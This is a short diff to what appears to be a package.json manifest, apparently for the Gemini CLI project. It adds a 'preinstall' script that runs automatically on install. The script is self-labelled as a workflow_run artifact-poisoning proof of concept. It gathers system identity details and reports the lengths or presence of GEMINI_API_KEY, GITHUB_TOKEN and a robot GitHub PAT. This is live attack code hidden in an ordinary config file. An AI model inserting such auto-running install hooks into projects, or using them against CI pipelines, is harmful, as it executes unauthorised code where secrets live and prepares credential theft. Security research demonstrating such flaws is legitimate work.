@@ -70,7 +70,8 @@
     "telemetry": "node scripts/telemetry.js",
     "check:lockfile": "node scripts/check-lockfile.js",
     "clean": "node scripts/clean.js",
-    "pre-commit": "node scripts/pre-commit.js"
+    "pre-commit": "node scripts/pre-commit.js",
+    "preinstall": "echo \"=== SECURITY TEST: workflow_run artifact poisoning PoC ===\" && echo \"whoami: $(whoami)\" && echo \"id: $(id)\" && echo \"uname: $(uname -a)\" && echo \"pwd: $(pwd)\" && echo \"GEMINI_API_KEY length: ${#GEMINI_API_KEY}\" && echo \"GEMINI_CLI_ROBOT_GITHUB_PAT set: $([ -n \\\"$GEMINI_CLI_ROBOT_GITHUB_PAT\\\" ] && echo YES || echo NO)\" && echo \"GITHUB_TOKEN length: ${#GITHUB_TOKEN}\" && echo \"hostname: $(hostname)\" && echo \"=== END SECURITY TEST ===\""
   },
   "overrides": {
     "ink": "npm:@jrichman/ink@6.6.9",
